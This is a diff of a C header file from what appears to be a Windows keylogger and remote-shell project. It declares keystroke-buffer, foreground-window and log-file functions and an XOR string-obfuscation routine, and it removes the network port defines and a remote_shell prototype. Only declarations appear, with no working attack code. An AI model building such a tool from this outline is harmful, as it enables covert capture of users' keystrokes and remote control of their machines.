@@ -11,7 +11,7 @@
 
 #define NTDDI_WIN11_DT 0x0A000007
 
-#pragma warning(disable:5045)
+#pragma warning(disable: 5045)
 #pragma warning(disable: 4820)
 #pragma warning(disable: 4548)
 
@@ -29,18 +29,6 @@
 
 #include "rshell.h"
 
-
-#pragma comment (lib, "Ws2_32.lib")
-
-/* 
-    minimal version facor compilator 
-    0x0A00 -> windows 10
-*/
-
-#define DEFAULT_BUFLEN 512
-#define DEFAULT_PORT "27015"
-#define MAX_CLIENTS 64
-
 extern HWND LOG_FD;
 
 #define DBG(fmt, ...)                                      \
@@ -56,7 +44,7 @@ do {                                                       \
 } while (0)
 
 
-// unciode
+// unicode
 #define DBG_unicode(fmt, ...)                                      \
     do {                                                           \
         wchar_t _wbuf[512];                                        \
@@ -82,19 +70,7 @@ void WriteToFile(char* str);
 void _GetForegroundWindow(HWND hwnd);
 void CreateLogFile(void);
 
-// logs.c
-// void    WriteLogs(WCHAR *userInput);
-
-
-// input.c
-WCHAR    *input_get_buffer(void);
-void    input_add_key(WCHAR c);
-WCHAR    *input_buffer(void);
-void    input_clean_buffer(void);
-void    input_add_string(char *str);
-
+// obfuscation.c
 unsigned char *XorStrings(char *enc);
-
-// int remote_shell(void);
 
 #endif
